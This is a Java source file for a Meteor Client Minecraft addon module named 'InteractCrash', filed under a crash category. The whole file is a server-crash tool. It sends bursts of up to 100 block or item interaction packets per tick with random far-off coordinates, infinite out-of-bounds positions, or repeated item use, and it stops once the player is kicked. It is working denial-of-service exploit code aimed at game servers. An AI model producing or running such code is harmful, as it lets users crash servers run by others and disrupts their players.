package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class InteractCrash extends Module {
    public enum Mode { NoCom, OOB, Item }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.NoCom).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(15).min(1).sliderMax(100).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private final Random random = new Random();

    public InteractCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "interact-crash",
            "Sends block/item interaction packets at random or out-of-bounds positions.");
    }

    private Vec3d randomPos() {
        return new Vec3d(random.nextInt(0xFFFFFF), 255, random.nextInt(0xFFFFFF));
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        switch (mode.get()) {
            case NoCom -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d p = randomPos();
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                        Hand.MAIN_HAND, new BlockHitResult(p, Direction.DOWN, BlockPos.ofFloored(p), false), 0));
                }
            }
            case OOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                    Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
            }
            case Item -> {
                for (int i = 0; i < amount.get(); i++)
                    mc.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, 0f, 0f));
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
